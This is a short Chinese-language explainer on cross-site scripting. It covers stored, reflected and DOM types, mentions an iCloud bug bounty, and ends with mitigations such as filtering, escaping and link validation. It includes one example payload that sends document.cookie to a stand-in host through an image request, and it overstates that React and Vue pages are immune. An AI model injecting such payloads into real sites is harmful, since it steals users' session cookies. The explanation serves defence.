# 什么XSS攻击，如何避免

#### 跨站脚本攻击（XSS）

脚本攻击缩写为XSS。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。XSS攻击一般分三种类型：存储型 、反射型 、DOM型XSS

2021 年 2 月印度的一名测试工程师在苹果 iCloud 官网中发现了一个跨站脚本攻击漏洞，并向苹果公司提交了具体的漏洞说明和触发的操作步骤。事后，苹果公司给这名印度人发放了 5000 美金的奖金。

跨站脚本（Cross Site Scripting），顾名思义，就是利用漏洞将脚本注入网页中。比如提交个人信息的输入框，如果在服务端没有处理好就有可能触发跨站脚本。

假设有一个输入个人签名的多行文本输入框，正常用户会输入几句有趣的话，但是黑客可能会尝试输入：

    scriptdocument.createElement('img').src="https://some.site.com?cookie=document.cookie"/script

如果这段话被显示到用户的个人主页，那么访问这个用户空间的其他用户就会被攻击，进而被黑客拿走 Cookie 中的关键信息。

XSS 攻击模式很简单，就是想办法向网站的页面上注入脚本。总的来说，输入框是一个重灾区。目前随着前端技术的发展，使用前端框架，比如 React 或 Vue 开发的页面已经杜绝了被 XSS 的可能。但是有时候如果工作出现某些疏漏，还是会导致 XSS 的发生。所以正确的做法是上线前拜托安全部门的同学协助进行一些针对 XSS 漏洞的扫描。

#### 如何避免

对输入进行过滤，过滤标签等，只允许合法值。
HTML转义
对于链接跳转，如<a href="xxx" 等，要校验内容，禁止以script开头的非法链接。
限制输入长度
